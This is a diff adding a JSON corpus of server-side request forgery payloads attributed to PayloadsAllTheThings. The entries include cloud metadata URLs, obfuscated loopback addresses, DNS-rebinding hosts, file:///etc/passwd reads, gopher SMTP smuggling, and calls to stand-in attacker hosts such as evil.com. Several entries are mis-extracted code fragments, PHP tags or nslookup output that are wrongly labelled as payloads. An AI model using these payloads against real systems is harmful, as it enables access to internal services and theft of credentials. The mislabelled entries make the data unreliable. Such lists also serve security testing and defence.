@@ -1,0 +1,762 @@
+[
+  {
+    "payload": "url = input(\"Enter URL:\")",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "response = requests.get(url)",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "return response",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://169.254.169.254/latest/meta-data/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://localhost:80",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://localhost:22",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "https://localhost:443",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.0.0.1:80",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.0.0.1:22",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "https://127.0.0.1:443",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://0.0.0.0:80",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://0.0.0.0:22",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "https://0.0.0.0:443",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://[::]:80/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://[0000::1]:80/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://[::ffff:127.0.0.1]",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.127.127.127",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.0.1.3",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.0.0.0",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://0/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.0.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://2130706433/ = http://127.0.0.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://3232235521/ = http://192.168.0.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://3232235777/ = http://192.168.1.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://2852039166/ = http://169.254.169.254",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://0177.0.0.1/ = http://127.0.0.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://o177.0.0.1/ = http://127.0.0.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://0o177.0.0.1/ = http://127.0.0.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://q177.0.0.1/ = http://127.0.0.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://0x7f000001 = http://127.0.0.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://0xc0a80101 = http://192.168.1.1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://0xa9fea9fe = http://169.254.169.254",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.0.0.1/%61dmin",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.0.0.1/%2561dmin",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://\u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc = example.com",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://ip6-localhost = ::1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://ip6-loopback = ::1",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "https://307.r3dir.me/--to/?url=http://localhost",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "Address: 1.2.3.4",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "Address: 169.254.169.254",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.1.1.1:80\\@127.2.2.2:80/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.1.1.1:80\\@@127.2.2.2:80/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.1.1.1:80:\\@@127.2.2.2:80/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http://127.1.1.1:80#\\@127.2.2.2:80/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "http:127.0.0.1/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "<?php",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "echo var_dump(filter_var(\"http://test???test.com\", FILTER_VALIDATE_URL));",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "echo var_dump(filter_var(\"0://evil.com;google.com\", FILTER_VALIDATE_URL));",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "?>",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "jar:scheme://domain/path!/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "jar:http://127.0.0.1!/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "jar:https://127.0.0.1!/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "jar:ftp://127.0.0.1!/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "file:///etc/passwd",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "file://\\/\\/etc/passwd",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "ssrf.php?url=http://127.0.0.1:22",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "ssrf.php?url=http://127.0.0.1:80",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "ssrf.php?url=http://127.0.0.1:443",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "ssrf.php?url=dict://attacker:11111/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "ssrf.php?url=sftp://evil.com:11111/",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "ssrf.php?url=ldap://localhost:11211/%0astats%0aquit",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "ssrf.php?url=netdoc:///etc/passwd",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "gopher://[host]:[port]/[type][selector]",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  },
+  {
+    "payload": "https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg",
+    "category": "ssrf",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "ssrf payload from documentation",
+    "tags": [
+      "ssrf"
+    ]
+  }
+]
